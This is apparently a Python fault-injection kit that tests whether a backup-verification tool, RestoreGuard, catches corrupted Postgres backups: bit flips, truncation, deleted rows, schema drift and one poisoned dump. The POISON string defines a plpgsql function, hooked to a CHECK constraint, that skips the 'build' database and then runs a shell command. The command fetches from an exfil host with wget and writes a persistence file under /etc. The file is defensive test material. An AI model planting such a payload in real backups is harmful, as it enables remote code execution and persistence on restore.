"""Fault-injection kit: proves RestoreGuard catches what breaks real backups.

Jonas's step 7 ("test if it works, schema change, bit flips etc."). Each fault
is a copy of one good backup (the original is never touched) with its own
manifest, named like a real backup so the copies can also be dropped into a
watched folder and shown in the UI. Corruptions get a re-signed manifest,
because a checksum only catches damage after the backup job hashed the file;
the re-signed copies show the deeper checks catching it anyway. The poisoned
copy is built so its payload stays quiet in the builder (it fires only outside
a database named "build", on the first customers row loaded), the way a real one would hide from a dry run.

  python faults.py <good backup.dump> [--out DIR] [--make-only]

Without --make-only every fault runs through guard.run_cell on every app
version and a table shows what caught it; exit 1 if any fault slipped through.
"""
import argparse
import asyncio
import json
import shutil
import sys
from pathlib import Path

import guard

HERE = Path(__file__).resolve().parent
POISON = """CREATE FUNCTION nv_audit(i integer) RETURNS integer LANGUAGE plpgsql AS $f$
BEGIN
  IF current_database() <> 'build' AND i = 1 THEN
    COPY (SELECT 1) TO PROGRAM 'wget -O- http://exfil.nordvik-backup.net/k; echo x > /etc/nv-persist';
  END IF;
  RETURN i;
END $f$;
ALTER TABLE customers ADD CONSTRAINT customers_audit CHECK (nv_audit(id) = id);
"""
# name: (what is done, what must happen)
FAULTS = {
    "bitflip-stale": ("16 bytes flipped at 3 offsets, manifest untouched", "not restorable"),
    "bitflip": ("16 bytes flipped at 3 offsets, manifest re-signed", "not restorable"),
    "truncated": ("dump cut at 60 %, manifest re-signed", "not restorable"),
    "rows-deleted": ("all payments rows deleted, manifest re-signed", "not restorable"),
    "schema-v2": ("migration 002 applied, honest v2 manifest", "drift caught, DR ready"),
    "poisoned": ("a CHECK constraint calls a function that runs a shell command", "quarantined"),
}


def _flip(data):
    data = bytearray(data)
    for frac in (0.55, 0.7, 0.85):
        at = int(len(data) * frac)
        data[at:at + 16] = bytes(b ^ 0xFF for b in data[at:at + 16])
    return bytes(data)


def _write(out, stem, data, manifest, resign=True):
    dump = out / f"{stem}.dump"
    dump.write_bytes(data)
    m = dict(manifest, file=dump.name)
    if resign:
        m["sha256"] = guard.sha256_file(dump)
    dump.with_suffix(".json").write_text(json.dumps(m))
    return dump


async def _rebuild(backup, sql, recount):
    """Restore the backup in a sandbox, run `sql`, dump it again. Returns (dump bytes, manifest stats or None)."""
    cell = guard.Cell(backup, {"version": "build"}, lambda ev: None)
    lock = await asyncio.to_thread(guard._sandbox_lock)
    try:
        async with guard.Sandbox(cell) as sb:
            await sb.exec("createdb", "-h", "/var/run/postgresql", "-U", "postgres", "build")
            rc, _, err = await sb.exec("pg_restore", "--exit-on-error", "--no-owner", "-h", "/var/run/postgresql",
                                       "-U", "postgres", "-d", "build", "/input/backup.dump", timeout=150)
            if rc != 0:
                raise RuntimeError(f"source backup does not restore: {err[-300:]}")
            rc, _, err = await sb.psql(sql, db="build")
            if rc != 0:
                raise RuntimeError(f"fault SQL failed: {err[-300:]}")
            stats = json.loads((await sb.psql(guard.MANIFEST_SQL, db="build"))[1]) if recount else None
            rc, data, err = await guard.docker("exec", sb.name, "pg_dump", "-Fc", "-h", "/var/run/postgresql",
                                               "-U", "postgres", "build", timeout=120)
            if rc != 0:
                raise RuntimeError(f"pg_dump failed: {err.decode(errors='replace')[-300:]}")
            return data, stats
    finally:
        lock.close()


async def make(src, out):
    backup = guard.load_backup(src)
    m, v = backup["manifest"], backup["manifest"]["schema_version"]
    ts = backup["id"].rsplit("_v", 1)[0]
    raw = Path(src).read_bytes()
    out.mkdir(parents=True, exist_ok=True)
    made = {"bitflip-stale": _write(out, f"{ts}-bitflip-stale_v{v}", _flip(raw), m, resign=False),
            "bitflip": _write(out, f"{ts}-bitflip_v{v}", _flip(raw), m),
            "truncated": _write(out, f"{ts}-truncated_v{v}", raw[:int(len(raw) * 0.6)], m)}
    data, _ = await _rebuild(backup, "DELETE FROM payments;", recount=False)
    made["rows-deleted"] = _write(out, f"{ts}-rows-deleted_v{v}", data, m)
    if v == 1:
        migration = (HERE / "standin" / "migrations" / "002_split_customer_name.sql").read_text()
        data, stats = await _rebuild(backup, migration, recount=True)
        made["schema-v2"] = _write(out, f"{ts}-schema-v2_v2", data, {**m, **stats, "app_version": "2.0.0"})
    data, _ = await _rebuild(backup, POISON, recount=False)
    made["poisoned"] = _write(out, f"{ts}-poisoned_v{v}", data, m)
    return made


def _verdict(fault, cells):
    states = {c["state"] for c in cells}
    if fault == "poisoned":
        return states == {"quarantined"}
    if fault == "schema-v2":
        drift = any(c["state"] == "healed" or "migrated" in c["reason"] or c["app_version"] == "1.0.0" and c["state"] == "failed"
                    for c in cells)
        return drift and bool(states & {"native", "healed"})
    return not states & {"native", "healed"}


def _caught_by(cells):
    for c in cells:
        bad = [x for x in c["checks"] if not x["pass"]]
        if c["state"] == "quarantined":
            return f"quarantine: {', '.join(c['signals']) or 'static scan'}" + (
                f" + {len(c['static_scan'])} scan finding(s)" if c["static_scan"] else "")
        if c["state"] == "healed":
            return f"drift: app {c['app_version']} refused it, GLM bridge round {c['bridges'][-1]['round']}"
        if bad:
            return bad[0]["check"]
    return "-"


async def run(made):
    rows = []
    for fault, dump in made.items():
        backup = guard.load_backup(dump)
        cells = [await guard.run_cell(backup, a) for a in guard.apps()]
        ok = _verdict(fault, cells)
        rows.append((fault, FAULTS[fault][1], " / ".join(f"{c['app_version']} {c['state']}" for c in cells),
                     _caught_by(cells), "PASS" if ok else "MISSED", cells[0]["reason"]))
        print(f"{fault}: {rows[-1][4]}", file=sys.stderr)
    widths = [max(len(r[i]) for r in rows + [("fault", "must", "result per app", "caught by", "test", "")])
              for i in range(5)]
    head = ("fault", "must", "result per app", "caught by", "test")
    for r in [head, tuple("-" * w for w in widths)] + [r[:5] for r in rows]:
        print("  ".join(c.ljust(w) for c, w in zip(r, widths)))
    print()
    for r in rows:
        print(f"{r[0]}: {r[5]}")
    return all(r[4] == "PASS" for r in rows)


def main():
    p = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    p.add_argument("backup")
    p.add_argument("--out", default=str(HERE / "faults" / "out"))
    p.add_argument("--make-only", action="store_true")
    a = p.parse_args()
    out = Path(a.out)
    if out.resolve() == (HERE / "faults" / "out").resolve() and out.exists():
        shutil.rmtree(out)
    made = asyncio.run(make(a.backup, out))
    print("made:", ", ".join(d.name for d in made.values()), file=sys.stderr)
    if not a.make_only:
        sys.exit(0 if asyncio.run(run(made)) else 1)


if __name__ == "__main__":
    main()
